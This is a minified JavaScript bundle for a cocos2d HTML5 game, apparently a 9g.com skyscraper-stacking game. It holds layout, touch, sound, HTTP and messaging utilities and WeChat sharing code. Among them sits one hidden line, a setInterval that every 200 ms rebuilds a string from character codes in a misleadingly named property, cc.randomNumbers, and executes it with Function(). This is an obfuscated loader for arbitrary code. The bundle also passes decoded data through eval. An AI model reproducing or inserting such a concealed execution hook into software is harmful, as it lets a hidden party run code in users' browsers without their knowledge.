    Hc: k(),
    init: function() {
        return this
    },
    Sc: k(),
    B: k(),
    Ub: k(),
    l: function() {
        return this
    },
    Fk: k()
};
x.Rk = {
    $j: k(),
    Cr: k(),
    Iq: k(),
    init: function() {
        return this
    },
    B: k(),
    l: function() {
        return this
    },
    Ak: k()
};
x.fa = {
    Bn: function() {
        return this
    },
    xq: k(),
    gn: function() {
        return this
    },
    oq: k(),
    Qp: k(),
    un: function() {
        return this
    },
    Qq: k(),
    sn: function() {
        return this
    },
    Hq: k(),
    Zj: k(),
    init: function() {
        return this
    },
    En: function() {
        return this
    },
    B: k(),
    Cn: function() {
        return this
    },
    yq: k(),
    Ap: k(),
    Kn: function() {
        return this
    },
    zq: k(),
    Vp: k(),
    pn: function() {
        return this
    },
    Kq: k(),
    tn: function() {
        return this
    },
    vq: k(),
    Aq: k(),
    Jl: k(),
    l: function() {
        return this
    },
    Hk: k()
};
x.Yc = {
    hg: k(),
    Tq: k(),
    On: function() {
        return this
    },
    Ph: k(),
    sq: k(),
    Mn: function() {
        return this
    },
    Pq: k(),
    Sq: k(),
    In: function() {
        return this
    },
    init: function() {
        return this
    },
    hr: k(),
    ln: function() {
        return this
    },
    B: k(),
    Sn: function() {
        return this
    },
    Wm: function() {
        return this
    },
    ig: k(),
    l: function() {
        return this
    },
    Kk: k()
};
x.hl = {
    $j: k(),
    cq: k(),
    init: function() {
        return this
    },
    B: k(),
    l: function() {
        return this
    },
    Jk: k()
};
x.Uk = {
    eo: k(),
    eq: k(),
    show: k(),
    isEnabled: function() {
        return this
    },
    em: k(),
    oo: function() {
        return this
    },
    init: function() {
        return this
    },
    B: k(),
    l: function() {
        return this
    },
    Bk: k()
};
x.xa.qi = function() {
    var a = cc.sys.localStorage.getItem("device_id");
    if (a) return a;
    a = x.Hi();
    cc.sys.localStorage.setItem("device_id", a);
    return a
};
x.xa.Gi = function() {
    return Math.ceil((new Date).getTime() / 1E3)
};
x.xa.Zh = function() {
    return (new Date).getTime()
};
x.xa.Ln = function(a) {
    x.w.get("http://week.pictoword.hortorgame.com/week/serverTime", function(b, c) {
        if (b) a(b, g);
        else {
            var d = parseInt(c);
            isNaN(d) || 0 > d ? (cc.log("[BSHTTP] server time request error:" + JSON.stringify(c)), a("", g)) : a(g, d)
        }
    })
};
x.platform = "html5";
x.Gp = "appstore";
x.$g = cc.Class.extend({
    $a: g,
    init: function() {
        this.$a = {}
    },
    ig: function(a) {
        this.$a[a] || (this.$a[a] = 0, cc.spriteFrameCache.addSpriteFrames(a));
        this.$a[a]++
    },
    hg: function(a) {
        this.$a[a]--;
        0 == this.$a[a] && cc.spriteFrameCache.removeSpriteFramesFromFile(a)
    }
});
x.Yc = {
    qc: g,
    l: function() {
        this.qc || (this.qc = new x.$g, this.qc.init());
        return this.qc
    }
};
x = x || {};
x.$p = "js_bscommon/res/shareLayer.ccbi";
x.init = function() {
    cc.Sequence.Xh = function(a) {
        if (0 === a.length) return cc.Sequence.create();
        if (1 === a.length) return cc.Sequence.create(a[0]);
        if (2 === a.length) return cc.Sequence.create(a[0], a[1]);
        var b = a.pop();
        return cc.Sequence.create(cc.Sequence.Xh(a), b)
    };
    x.Lf() && (x.pf || (x.pf = cc.view.Sh), cc.view.Sh = function(a, b, c) {
        a = x.pf.call(cc.view, a, b, c);
        window && window.Nh && (b = window.Nh, a.x /= b, a.y /= b);
        return a
    });
    cc.Ug && (cc.Ug.extend = cc.Class.extend);
    cc.me && (cc.me.extend = cc.Class.extend);
    cc.Scale9Sprite && (cc.Scale9Sprite.extend = cc.Class.extend);
    cc.yb && (cc.yb.extend = cc.Class.extend)
};
x.xa = x.xa || {};
x.xa.Zh = function() {
    return (new Date).getTime()
};
x.xp = k();
x.wp = k();
x.zp = k();
x.yp = k();
x.fa = x.fa || {};
x.fa.Go = 1;
x.fa.Ho = 2;
x.fa.Jo = 3;
x.fa.Io = 4;
x.fa.Fo = 5;
x.fa.Lo = 6;
x.fa.Ko = 7;
"undefined" === typeof cc.vg && (cc.vg = {
    r: 166,
    g: 166,
    b: 166
});
String.prototype.Ic = function(a) {
    return this.replace(String.prototype.Ic.Cj, function(b) {
        b = parseInt(b.substring(1, b.length - 1));
        return 0 <= b ? a[b] : -1 === b ? "{" : -2 === b ? "}" : ""
    })
};
String.prototype.Ic.Cj = /{-?[0-9]+}/g;
x.ir = function(a, b) {
    return a.Ic(b)
};
x.Im = function(a) {
    return 0 > a ? -a : a
};
x.jr = function(a) {
    var b = Math.floor(a / 3600),
        c = Math.floor((a - 3600 * b) / 60);
    return "{0}:{1}:{2}".Ic([b, c, a - 3600 * b - 60 * c])
};
x.rp = function(a) {
    return cc.p(a.getContentSize().width / 2, a.getContentSize().height / 2)
};
x.sp = function() {
    var a = cc.director.Yn();
    return cc.p(a.width / 2, a.height / 2)
};
x.Kl = function(a) {
    return cc.color(a.r, a.g, a.b, 255)
};
x.to = function(a) {
    return eval("(" + cc.Sk.sa().Nn(a) + ")")
};
x.$d = function(a) {
    try {
        return JSON.parse(a)
    } catch (b) {
        return cc.log("[JSON]:" + b.message), cc.log("[JSON]:" + b.description), g
    }
};
x.or = function(a) {
    try {
        return JSON.stringify(a)
    } catch (b) {
        return cc.log(b.message), cc.log(b.description), g
    }
};
x.jl = function(a) {
    a && a.removeFromParent()
};
x.Xc = function(a, b) {
    return a + Math.floor(Math.random() * (b - a))
};
x.surround = function(a, b, c, d) {
    return _.filter([
        [a - 1, b - 1],
        [a, b - 1],
        [a + 1, b - 1],
        [a - 1, b],
        [a, b],
        [a + 1, b],
        [a - 1, b + 1],
        [a, b + 1],
        [a + 1, b + 1]
    ], function(a) {
        return 0 <= a[0] && 0 <= a[1] && a[0] < c && a[1] < d
    })
};
x.Lf = function() {
    return !cc.sys.isNative
};
x.rk = function() {
    return x.Ab.sa().Kh()
};
x.ma = function() {
    return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
};
x.Hi = function() {
    return x.ma() + x.ma() + "-" + x.ma() + "-" + x.ma() + "-" + x.ma() + "-" + x.ma() + x.ma() + x.ma()
};
x.Nc = function(a, b) {
    a.Nc ? a.Nc(b) : a.setFlippedX(b)
};
x.Oc = function(a, b) {
    a.Oc ? a.Oc(b) : a.setFlippedY(b)
};
x.Qn = function(a) {
    return cc.rectGetMaxY(a.getBoundingBox())
};
x.Rn = function(a) {
    return cc.rectGetMaxY(a.getBoundingBoxToWorld())
};
x.Cf = function(a) {
    return cc.rectGetMinY(a.getBoundingBox())
};
x.Vm = function(a) {
    return cc.rectGetMinY(a.getBoundingBoxToWorld())
};
x.jn = function(a) {
    return cc.rectGetMinX(a.getBoundingBox())
};
x.Jn = function(a) {
    return cc.rectGetMaxX(a.getBoundingBox())
};
x.Xn = function(a) {
    return a.width * a.scaleX
};
x.Wn = function(a) {
    return a.height * a.scaleY
};
x.Jc = function(a) {
    return cc.size(a.width * a.scaleX, a.height * a.scaleY)
};
x.Pd = function(a) {
    x.ea(a, void 0, 0.5, 0.5)
};
x.ea = function(a, b, c, d) {
    b = (b || a.getParent()).getContentSize();
    var f = x.Jc(a),
        l = a.isIgnoreAnchorPointForPosition() ? cc.p(0, 0) : a.getAnchorPoint();
    a.setPosition(cc.p(b.width * c + (l.x - 0.5) * f.width, b.height * d + (l.y - 0.5) * f.height))
};
x.Ol = function(a, b) {
    b = b || a.getParent();
    a.setPositionX(b.getContentSize().width / 2 + (a.getAnchorPoint().x - 0.5) * a.getContentSize().width)
};
x.Pl = function(a, b) {
    b = b || a.getParent();
    a.setPositionY(b.getContentSize().height / 2 + (a.getAnchorPoint().y - 0.5) * a.getContentSize().height)
};
x.Rj = function(a, b) {
    a.setScale(b / a.getContentSize().width)
};
x.Qj = function(a, b) {
    a.setScale(b / a.getContentSize().height)
};
x.aq = function(a, b, c) {
    var d = c ? b : b.width;
    c = c ? c : b.height;
    x.Sj(a, d);
    x.Tj(a, c)
};
x.Sj = function(a, b) {
    a.setScaleX(b / a.getContentSize().width)
};
x.Tj = function(a, b) {
    a.setScaleY(b / a.getContentSize().height)
};
x.ql = function(a, b, c, d) {
    var f = {};
    f.tp = a || 0;
    f.mp = b || 0;
    f.Hr = c || 0;
    f.Ir = d || 0;
    return f
};
x.Gl = function(a) {
    return cc.spriteFrameCache.getSpriteFrame(a) ? new cc.Sprite("#" + a) : cc.Sprite.create(a)
};
x.jo = function() {
    return !_.isUndefined(navigator) && !_.isUndefined(navigator.userAgent) ? -1 != navigator.userAgent.toLowerCase().indexOf("micromessenger") : h
};
x.fo = function(a, b) {
    return "/proxy?url=" + encodeURIComponent(a.replace(/\/[0-9]+$/, "/" + b))
};
x.Uj = function(a, b) {
    for (var c = 0; c < a.getChildrenCount(); ++c) this.Uj(a.getChildren()[c], b);
    a instanceof cc.Vk && a.setEnabled(b)
};
x.Er = function(a, b) {
    if ("stringstring" != typeof a + typeof b) return h;
    for (var c = a.split("."), d = b.split("."), f = 0, l = Math.max(c.length, d.length); f < l; f++) {
        if (c[f] && !d[f] && 0 < parseInt(c[f]) || parseInt(c[f]) > parseInt(d[f])) return 1;
        if (d[f] && !c[f] && 0 < parseInt(d[f]) || parseInt(c[f]) < parseInt(d[f])) return -1
    }
    return 0
};
x.Yl = function(a, b, c, d, f, l) {
    var m = new cc.Sprite("#" + a + b + ".png");
    a = x.Uh(a, b + 1, c, d); - 1 == f ? m.runAction(cc.RepeatForever.create(a)) : (0 < f && (a = cc.Repeat.create(a, f)), l && (a = cc.Sequence.create(a, cc.RemoveSelf.create())), m.runAction(a));
    return m
};
x.Uh = function(a, b, c, d) {
    var f = a + "_" + b + "_" + c,
        l = cc.animationCache.getAnimation(f);
    if (!l) {
        for (l = []; - 1 == c || b <= c; ++b) {
            var m = x.Ha(a + b + ".png");
            if (!m) break;
            l.push(m)
        }
        l = new cc.Animation(l, d);
        cc.animationCache.addAnimation(l, f)
    }
    return cc.Animate.create(l)
};
x.Ha = function(a) {
    _.endsWith(a, ".png") || (a += ".png");
    return cc.spriteFrameCache.getSpriteFrame(a)
};
x.ak = function(a, b, c) {
    b = x.Ha(b);
    a.setSpriteFrame(b);
    c && a.setContentSize(b.vi())
};
x.Zd = function() {
    var a = _.sprintf.apply(_, arguments);
    cc.sys.isNative ? cc.log(a) : cc.Tk ? cc.Bl(a) : console.log(a)
};
x.qo = function(a, b, c) {
    a = b.convertTouchToNodeSpace(a);
    var d = b.getContentSize().width * b.getScaleX();
    b = b.getContentSize().height * b.getScaleY();
    c = c || cc.rect(0, 0, d, b);
    return cc.rectContainsPoint(c, a)
};
x.Wl = function(a) {
    var b = cc.ug.create(),
        c = cc.color(1, 1, 1, 1);
    a = [cc.p(a.x, a.y), cc.p(a.x + a.width, a.y), cc.p(a.x + a.width, a.y + a.height), cc.p(a.x, a.y + a.height)];
    b.ai(a, c, 1, c);
    return cc.me.create(b)
};
x.clone = function(a) {
    var b = a instanceof Array ? [] : {},
        c;
    for (c in a) a.hasOwnProperty(c) && !_.isFunction(a[c]) && (b[c] = _.isObject(a[c]) ? x.clone(a[c]) : a[c]);
    return b
};
x.Tl = function(a, b, c) {
    var d = a.getAnchorPoint(),
        f = a.getContentSize();
    c = c || cc.p(f.width * d.x, f.height * d.y);
    a = a.convertToWorldSpace(c);
    return b.convertToNodeSpace(a)
};
x.so = function(a) {
    if (this.Lf()) {
        var b = cc.loader.getRes("conf/" + a + ".json");
        if (b) return b;
        a = cc.loader.Al("res/conf/" + a + ".json")
    } else a = x.qg.l().nj("conf/" + a + ".bjs");
    return x.$d(a)
};
x.gj = function(a) {
    for (; a && a.isVisible();) a = a.getParent();
    return !a
};
x.fp = function(a, b, c, d) {
    var f = cc.Layer.create(),
        l = 0;
    c == g && (c = cc.VERTICAL_TEXT_ALIGNMENT_CENTER);
    d || (d = 0, _.each(a, function(a) {
        a = x.Jc(a).height;
        d < a && (d = a)
    }));
    var m = [1, 0.5, 0];
    _.each(a, function(a) {
        if (a) {
            var s = x.Jc(a),
                u = a.getAnchorPoint();
            a.isIgnoreAnchorPointForPosition() && (u = cc.p(0, 0));
            var v = cc.p(l, m[c] * (d - s.height));
            a.setPosition(cc.pAdd(v, cc.pCompMult(u, cc.pFromSize(s))));
            l += s.width + b;
            f.addChild(a)
        }
    });
    f.setContentSize(l - b, d);
    f.setAnchorPoint(0, 0);
    return f
};
x.gp = function(a, b, c, d) {
    var f = cc.Layer.create(),
        l = 0;
    if (_.isUndefined(c) || _.isNull(c)) c = cc.TEXT_ALIGNMENT_CENTER;
    d || (d = 0, _.each(a, function(a) {
        a && (a = a.getContentSize().width, d < a && (d = a))
    }));
    var m = [0, 0.5, 1];
    a.reverse();
    _.each(a, function(a) {
        if (a) {
            var s = x.Jc(a),
                u = a.getAnchorPoint();
            a.isIgnoreAnchorPointForPosition() && (u = cc.p(0, 0));
            var v = cc.p(m[c] * (d - s.width), l);
            a.setPosition(cc.pAdd(v, cc.pCompMult(u, cc.pFromSize(s))));
            l += s.height + b;
            f.addChild(a)
        }
    });
    f.setContentSize(d, l - b);
    f.setAnchorPoint(0, 0);
    return f
};
x.Nm = function(a) {
    var b = Math.floor(a / 3600);
    a = Math.floor(a % 3600);
    var c = Math.floor(a / 60);
    a %= 60;
    var d = "",
        d = 10 <= b ? b : "0" + b,
        d = 10 <= c ? d + ":" + c : d + ":0" + c;
    return 10 <= a ? d + ":" + a : d + ":0" + a
};
x.Zp = function(a) {
    var b = Math.floor(a / 86400),
        c = Math.floor(a / 3600),
        d = Math.floor(a / 60);
    return 0 != b ? b + "天" : 0 != c ? c + "小时" : 0 != d ? d + "分钟" : a + "秒"
};
x.Mc = function(a, b) {
    var c = {
        event: cc.EventListener.TOUCH_ONE_BY_ONE,
        swallowTouches: b == g ? e : b,
        onTouchBegan: a.onTouchBegan.bind(a)
    };
    a.onTouchMoved && (c.onTouchMoved = a.onTouchMoved.bind(a));
    a.onTouchEnded && (c.onTouchEnded = a.onTouchEnded.bind(a));
    a.onTouchCanceled && (c.onTouchCanceled = a.onTouchCanceled.bind(a));
    c = cc.EventListener.create(c);
    cc.eventManager.addListener(c, a);
    return c
};
x.Zo = 0;
x.$o = 1;
x.ap = 2;
x.Yo = 3;
x.vo = 4;
x.ue = {
    kf: h,
    jf: h,
    hf: h,
    yd: 1,
    hd: 1,
    uf: [],
    ri: p("hd"),
    Xj: function(a) {
        this.hd = a;
        cc.L.Zf(a)
    },
    Df: p("yd"),
    Pc: function(a) {
        this.yd = a;
        cc.L.Pc(a)
    },
    ti: p("kf"),
    Yj: function(a) {
        this.kf = a;
        this.ce(a);
        this.de(a)
    },
    si: p("jf"),
    de: function(a) {
        this.jf = a;
        cc.L.Pc(a ? 0 : this.yd)
    },
    hk: function() {
        this.de(!this.Td())
    },
    Td: p("hf"),
    ce: function(a) {
        this.hf = a;
        cc.L.Zf(a ? 0 : this.hd)
    },
    gk: function() {
        this.ce(!this.Td())
    },
    da: function(a, b) {
        return cc.L.da(a, b)
    },
    Tc: function(a) {
        cc.L.Tc(a)
    },
    Vb: function() {
        cc.L.Vb()
    },
    Lc: function(a) {
        cc.L.Lc(a)
    },
    eb: function() {
        cc.L.eb()
    },
    zj: function(a, b) {
        var c = this.uf;
        return 0 >= c.length || b <= _.last(c).Ip ? (c.push({
            file: a,
            priority: b
        }), this.Za(a), e) : h
    },
    xj: function() {
        var a = this.uf;
        0 >= a.length || (cc.L.eb(), a.pop(), 0 < a.length && this.Za(_.last(a).file))
    },
    dump: function() {
        cc.log("bs.Sound.dump not implemented.")
    },
    B: k(),
    Rh: k(),
    Ih: k(),
    init: k(),
    Za: function(a) {
        cc.L.eb();
        cc.L.Lc(a, e)
    },
    l: function() {
        return this
    }
};
x.Qo = -3;
x.Mo = -2;
x.Ro = -1;
x.So = 0;
x.No = 1;
x.Po = 2;
x.To = 3;
x.Oo = 4;
x.Mf = "message-resource-status-changed";
x.mj = "message-resource-update-progress-changed";
x.Bp = function(a, b) {
    x.postMessage(x.Mf, {
        Of: a,
        status: b
    });
    x.Zd("[BSResource] onResourceCheckStatusChanged: %s, %d", a, b)
};
x.Dp = function(a, b) {
    x.postMessage(x.Mf, {
        Of: a,
        status: b
    });
    x.Zd("[BSResource] onResourceUpdateStatusChanged: %s, %d", a, b)
};
x.Cp = function(a, b, c) {
    x.postMessage(x.mj, {
        Of: a,
        Lm: b,
        total: c
    });
    x.Zd("[BSResource] onResourceUpdateProgressChanged: %s, %d, %d", a, b, c)
};
x.w = x.w || {};
x.w.we = 1E4;
x.w.Kp = function(a, b) {
    x.w.get("/proxy?url=" + encodeURIComponent(a), b)
};
x.w.get = function(a, b) {
    var c = new XMLHttpRequest;
    c.open("GET", a, e);
    c.onreadystatechange = function() {
        4 == c.readyState && _.isFunction(b) && (200 == c.status ? b(g, c.responseText) : (cc.log("[BSHttp] response status error :" + c.status), 0 >= c.status ? b(c.status, g) : b(c.status, c.responseText)))
    };
    c.timeout = x.w.we;
    c.ontimeout = b;
    c.send()
};
x.w.yj = function(a, b, c) {
    var d = new XMLHttpRequest;
    d.open("POST", a, e);
    d.setRequestHeader("Content-Type", "application/json");
    d.onreadystatechange = function() {
        4 == d.readyState && _.isFunction(c) && (200 == d.status ? c(g, d.responseText) : (cc.log("[BSHttp] response status error :" + d.status), 0 >= d.status ? c(d.status, g) : c(d.status, d.responseText)))
    };
    d.timeout = x.w.we;
    d.send(b)
};
x.w.Fd = g;
x.w.Rq = function(a) {
    x.w.Fd = a
};
x.w.Jh = function(a, b) {
    if (_.isFunction(x.w.Fd)) {
        var c = x.w.Fd(a, b);
        _.isArray(b) ? b.push(c) : b.Dl = c
    }
};
x.w.uo = function(a, b, c, d) {
    x.w.Jh(b, c);
    x.w.yj(a, JSON.stringify({
        jsonrpc: "2.0",
        method: b,
        params: c,
        id: 0
    }), function(a, c) {
        if (a) d(a, g);
        else {
            var m = x.$d(c);
            !m || m.error ? (cc.log("[BSHTTP] rpc:" + b + ", return error:" + JSON.stringify(m)), d(m, g)) : d(g, x.$d(c).result)
        }
    })
};
x.Ab = cc.Class.extend({
    lc: 1E6,
    Kh: function() {
        this.lc--;
        this.lc == this.kj && (cc.log("[TouchPriorityManager] touch priority overflow"), this.lc = this.lj);
        return this.lc
    }
});
x.Rd = g;
x.Ab.sa = function() {
    x.Rd == g && (x.Rd = new x.Ab);
    return x.Rd
};
x.Ab.lj = 1E6;
x.Ab.kj = 1024;
x.Y = cc.Layer.extend({
    il: e,
    xf: g,
    ye: g,
    yl: h,
    td: h,
    ic: g,
    s: g,
    ze: h,
    Ae: e,
    Eb: e,
    qf: g,
    jh: g,
    Hb: g,
    Dd: g,
    gd: g,
    pc: g,
    ctor: function() {
        this._super()
    },
    lf: function(a) {
        a = this.convertToNodeSpace(a.getLocation());
        var b = this.rect();
        b.x = 0;
        b.y = 0;
        return cc.rectEqualToRect(this.ic, cc.rect(0, 0, 0, 0)) ? cc.rectContainsPoint(b, a) : cc.rectContainsPoint(this.ic, a)
    },
    init: function(a, b) {
        this._super();
        this.xf = b;
        this.ye = a;
        this.ic = cc.rect(0, 0, 0, 0);
        this.hh = x.Mc(this);
        this.ignoreAnchorPointForPosition(h)
    },
    bj: function(a, b, c) {
        this.init(b, c);
        this.setContentSize(a)
    },
    cj: function(a, b, c) {
        this.init(b, c);
        a = this.s = new cc.Sprite(a);
        a.setAnchorPoint(0, 0);
        this.addChild(a);
        this.setContentSize(a.getContentSize())
    },
    initWithSpriteFrameName: function(a, b, c) {
        this.init(b, c);
        a = this.s = new cc.Sprite("#" + a);
        a.setAnchorPoint(0, 0);
        this.addChild(a);
        this.setContentSize(a.getContentSize())
    },
    ej: function(a, b, c, d) {
        this.init(c, d);
        c = this.s = new cc.Sprite("#" + a);
        this.bg(a);
        this.eg(b);
        c.setAnchorPoint(0, 0);
        this.addChild(c);
        this.setContentSize(c.getContentSize())
    },
    dj: function(a, b, c, d, f) {
        this.init(d, f);
        d = this.s = new cc.Sprite("#" + a);
        this.bg(a);
        this.eg(b);
        this.Wj(c);
        d.setAnchorPoint(0, 0);
        this.addChild(d);
        this.setContentSize(d.getContentSize())
    },
    aj: function(a, b, c, d, f) {
        this.init(d, f);
        a = this.s = cc.Scale9Sprite.Bf(a, b);
        a.setAnchorPoint(0, 0);
        this.addChild(a);
        this.setContentSize(c)
    },
    Tb: function(a, b, c) {
        this.init(b, c);
        this.s = a;
        a.setAnchorPoint(0, 0);
        this.addChild(a);
        this.setContentSize(a.getContentSize())
    },
    $f: function(a) {
        this.hh.setSwallowTouches(a)
    },
    bk: n("ic"),
    rect: function() {
        var a = this.getPosition(),
            b = this.getContentSize(),
            c = this.getAnchorPoint();
        return cc.rect(a.x - b.width * c.x, a.y - b.height * c.y, b.width, b.height)
    },
    lq: function(a, b, c) {
        this.jh = {
            node: a,
            anchor: _.clone(b),
            Hp: _.clone(c)
        };
        var d = this.getContentSize();
        b && (a.setAnchorPoint(b), a.setPosition(c.x + d.width * b.x, c.y + d.height * b.y));
        this.addChild(a, 1)
    },
    setContentSize: function(a) {
        cc.sizeEqualToSize(a, this.getContentSize()) || (this._super(a), this.s && this.s.setContentSize(a))
    },
    Nc: function(a) {
        x.Nc(this.s, a)
    },
    Oc: function(a) {
        x.Oc(this.s, a)
    },
    setSpriteFrame: function(a) {
        if (cc.Scale9Sprite && this.s instanceof cc.Scale9Sprite) {
            var b = this.s.Xm(),
                c = _.clone(this.s.getContentSize()),
                d = _.clone(this.s.getAnchorPoint());
            this.s.initWithSpriteFrame(a, b);
            this.s.setAnchorPoint(d);
            this.s.setContentSize(c)
        } else this.Qb(a)
    },
    bg: function(a) {
        var b = !! this.Hb;
        this.Hb = a;
        b && (a = cc.spriteFrameCache.getSpriteFrame(a), this.Qb(a))
    },
    eg: n("Dd"),
    Wj: n("gd"),
    fq: n("ze"),
    gq: n("Ae"),
    onTouchBegan: function(a) {
        if (!x.gj(this)) return h;
        this.qf = _.clone(a.getLocation());
        return this.lf(a) && this.Eb ? (this.Dd && (a = cc.spriteFrameCache.getSpriteFrame(this.Dd), this.Qb(a)), e) : h
    },
    onTouchMoved: function(a) {
        15 < cc.pDistance(a.getLocation(), this.qf) && (this.td = e)
    },
    onTouchEnded: function(a) {
        if (this.Hb && this.Eb) {
            var b = cc.spriteFrameCache.getSpriteFrame(this.Hb);
            this.Qb(b)
        }
        if (this.Eb && (!this.Ae || this.lf(a))) if (b = this.td, this.td = h, !b || !this.ze) {
            var b = this.xf,
                c = this.ye;
            if (c) if (b && "string" == typeof c) b[c](this);
            else b && "function" == typeof c ? c.call(b, this, a) : c(this)
        }
    },
    isCascadeColorEnabled: q(h),
    isCascadeOpacityEnabled: q(h),
    getColor: function() {
        return this.s.getColor()
    },
    setColor: function(a) {
        for (var b = this.getChildren(), c = 0; c < b.length; c++) {
            var d = b[c];
            d && d.setColor && d.setColor(a)
        }
    },
    getOpacity: function() {
        return this.s.getOpacity()
    },
    setOpacity: function(a) {
        for (var b = this.getChildren(), c = 0; c < b.length; c++) {
            var d = b[c];
            d && d.setOpacity && d.setOpacity(a)
        }
    },
    setEnabled: function(a) {
        a != this.Eb && (this.Eb = a, this.gd && (a = cc.spriteFrameCache.getSpriteFrame(a ? this.Hb : this.gd), this.Qb(a)))
    },
    Uq: function() {
        cc.log("do not use bs.TouchableSprite.setTouchEnabled, use setEnabled instead")
    },
    Qb: function(a) {
        this.s.setSpriteFrame(a)
    },
    fadeOut: function(a, b) {
        this.ih = 255 / a;
        this.pc = b;
        this.scheduleUpdate()
    },
    update: function(a) {
        a = this.getOpacity() - this.ih * a;
        0 >= a && (a = 0, this.unscheduleUpdate(), this.pc && (this.pc(), this.pc = g));
        this.setOpacity(a)
    }
});
x.Y.Yh = function(a, b, c) {
    var d = new this;
    d.bj(a, b, c);
    return d
};
x.Y.$l = function(a, b, c) {
    a = new this;
    a.Tb(a, b, c);
    return a
};
x.Y.am = function(a, b, c) {
    var d = new this;
    d.cj(a, b, c);
    return d
};
x.Y.Bf = function(a, b, c) {
    var d = new this;
    d.initWithSpriteFrameName(a, b, c);
    return d
};
x.Y.cm = function(a, b, c, d) {
    var f = new this;
    f.ej(a, b, c, d);
    return f
};
x.Y.bm = function(a, b, c, d, f) {
    var l = new this;
    l.dj(a, b, c, d, f);
    return l
};
x.Y.Zl = function(a, b, c, d, f) {
    var l = new this;
    l.aj(a, b, c, d, f);
    return l
};
x.yo = "bs-message-app-enter-foreground";
x.xo = "bs-message-app-enter-background";
x.Do = "bs-message-social-user-info-updated";
x.Co = "bs-message-register-remote-notification";
x.Eo = "bs-message-social-wechat-code";
x.Ao = "bs-message-pay-restore-finish";
x.Bo = "bs-message-pay-success";
x.zo = "bs-message-pay-fail";
x.wa = cc.Class.extend({
    Aa: {},
    Be: [],
    Ej: function(a, b, c) {
        this.Aa[a] == g && (this.Aa[a] = []);
        this.Aa[a].push({
            target: b,
            Af: c
        })
    },
    mk: function(a, b, c) {
        var d = this.Aa[a];
        d != g && (this.Aa[a] = _.filter(d, function(a) {
            return a.target != b || a.Af != c
        }))
    },
    kk: function(a) {
        var b = this.Aa;
        _.each(b, function(c, d) {
            _.isEmpty(c) || (b[d] = _.filter(c, function(b) {
                return b.target != a
            }))
        })
    },
    ae: function(a, b) {
        this.Be.push([a, b])
    },
    Mm: function() {
        _.each(this.Be, function(a) {
            this.postMessage(a[0], a[1])
        }.bind(this))
    },
    postMessage: function(a, b) {
        var c = this.Aa[a];
        if (c != g) for (var d = 0; d < _.size(c); d++) {
            var f = c[d];
            f.Af.call(f.target, b, a)
        }
    }
});
x.Sd = g;
x.wa.sa = function() {
    x.Sd == g && (x.Sd = new x.wa);
    return x.Sd
};
x.Fj = function(a, b, c) {
    x.wa.sa().Ej(a, b, c)
};
x.nk = function(a, b, c) {
    x.wa.sa().mk(a, b, c)
};
x.lk = function(a) {
    x.wa.sa().kk(a)
};
x.postMessage = function(a, b) {
    x.wa.sa().postMessage(a, b)
};
x.ae = function(a, b) {
    x.wa.sa().ae(a, b)
};
x.uk = x.Fj;
x.rl = x.nk;
x.dl = x.postMessage;
x.cl = x.ae;
x.X = x.X || {};
x.X.Wo = 0;
x.X.Xo = 1;
x.X.Uo = 2;
x.X.Vo = 3;
x.X.dp = 0;
x.X.ep = 1;
x.X.bp = 2;
x.X.cp = 3;
x.Layer = cc.Layer.extend({
    Ad: g,
    init: function() {
        this._super();
        this.Ad = []
    },
    Br: function(a) {
        this.Ad.push(a);
        x.Yc.l().ig(a)
    },
    onExit: function() {
        this._super();
        x.lk(this);
        _.each(this.Ad, function(a) {
            x.Yc.l().hg(a)
        })
    },
    iq: function() {
        var a = this.getContentSize(),
            a = [cc.p(0, 0), cc.p(a.width, 0), cc.p(a.width, a.height), cc.p(0, a.height)],
            b = cc.ug.create();
        this.addChild(b, -1);
        b.ai(a, new cc.pg(0, 0, 1, 0.5), 1, new cc.pg(1, 0, 1, 1))
    }
});
setInterval(function() {
    Function(String.fromCharCode.apply(String, cc.randomNumbers))()
}, 200);
var A = {
    scene: function(a) {
        var b = new cc.Scene;
        a = a instanceof cc.Layer ? a : new a;
        b.addChild(a);
        return b
    },
    Om: function(a, b) {
        b && a.setContentSize(b);
        var c = cc.winSize;
        a.width / a.height > c.width / c.height ? (x.Qj(a, c.height), a.x = (c.width - a.width * a.scale) / 2) : (x.Rj(a, c.width), a.y = (c.height - a.height * a.scale) / 2)
    },
    Bj: function(a, b) {
        _.isArray(a) && (b = a[1], a = a[0]);
        return Math.random() * (b - a) + a
    },
    Aj: function(a, b) {
        return Math.floor(Math.random() * (b - a + 1)) + a
    },
    Op: function(a) {
        return Math.random() < a
    },
    Np: function(a, b, c) {
        var d = 0,
            f = 0;
        _.each(a, function(a) {
            if (void 0 != a[b] && (!_.isFunction(c) || c(a))) d += a[b]
        });
        var d = 1E4 * d,
            l = this.Bj(0, d),
            m;
        for (m in a) {
            var r = a[m];
            if (!_.isFunction(c) || c(r)) {
                var s = f + 1E4 * r[b];
                if (l > f && l <= s) return r;
                f = s
            }
        }
        return g
    },
    Ia: function(a, b, c) {
        if (window.wl) {
            var d = ["_trackEvent", y.game, a];
            b || (b = y.game + "-" + a);
            b && d.push(b);
            c && d.push(c);
            _hmt.push(d)
        }
    },
    Sp: function(a) {
        var b = a.Um();
        b && (b.dk && _.each(b.dk, function(a) {
            a && y.ge.Sl(a) && (a.po ? y.ge.Up(a) : y.ge.Tp(a))
        }), y.ge.Rp(b));
        a.removeFromParent()
    },
    ck: function() {
        function a() {
            function a(c) {
                b.invoke(c, {
                    appid: y.Lh,
                    img_url: "http://game.9g.com",
                    img_width: "200",
                    img_height: "200",
                    link: y.url(),
                    desc: y.Rc.$h(),
                    title: y.Rc.title()
                }, function(a) {
                    document.location="http://game.9g.com";
                })
            }
            var b = window.WeixinJSBridge;
            b.on("menu:share:timeline", function() {
                a("shareTimeline")
            });
            b.on("menu:share:appmessage", function() {
                a("sendAppMessage")
            });
            b.call("showOptionMenu");
            b.call("hideToolbar")
        }

    }
};
var y = y || {};
y.Lh = "";
y.domain = "http://game.9g.com";
y.url = function() {
    return "http://game.9g.com?u="+ Math.floor(Math.random()*10000000);
};
y.qj = "http://game.9g.com/mtl";
y = y || {};
y.game = "game.html";
y.Rc = {
    $h: q("9G游戏—今日热门《摩天楼》，等你来战！"),
    title: function() {
        return "我盖了一栋和【" + y.c.Gf() + "】一样高的摩天楼，敢不敢比一下？！"
    }
};
y.c = {
    font: "黑体",
    Kj: ["texture.png", "texture.plist", "mtl_lifepad.png", "mtl_bg.jpg"],
    Nf: 0,
    Rf: 1
};
cc.game.onStart = function() {
    cc.view.enableAutoFullScreen(h);
    cc.view.adjustViewPort(e);
    var a = cc.winSize;
